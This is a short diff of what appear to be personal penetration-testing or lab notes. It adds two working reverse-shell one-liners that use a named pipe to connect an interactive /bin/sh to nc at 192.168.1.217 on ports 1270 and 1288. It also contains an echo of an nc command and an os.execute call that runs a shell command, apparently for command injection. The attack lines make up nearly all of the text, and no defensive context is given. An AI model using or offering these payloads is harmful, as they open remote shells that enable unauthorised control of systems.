@@ -71,9 +71,14 @@ echo ""
 ```
 
 
-echo "nc 10.9.0.106 1288" > /tmp/zz
+```
+/bin/sh -c &apos;(mkfifo /tmp/a; cat /tmp/a | /bin/sh -i 2>&1 | nc 192.168.1.217 1270 > /tmp/a)&&apos;
+```
 
-10.9.0.162
+```
+/bin/sh -c &apos;(mkfifo /tmp/zz; cat /tmp/zz | /bin/sh -i 2>&1 | nc 192.168.1.217 1288 > /tmp/zz)&&apos;
+```
+echo "nc 10.9.0.106 1288" > /tmp/zz
 
 os.execute("/bin/sh -c &apos;(ping -c2 10.9.0.162 )&apos;")
 
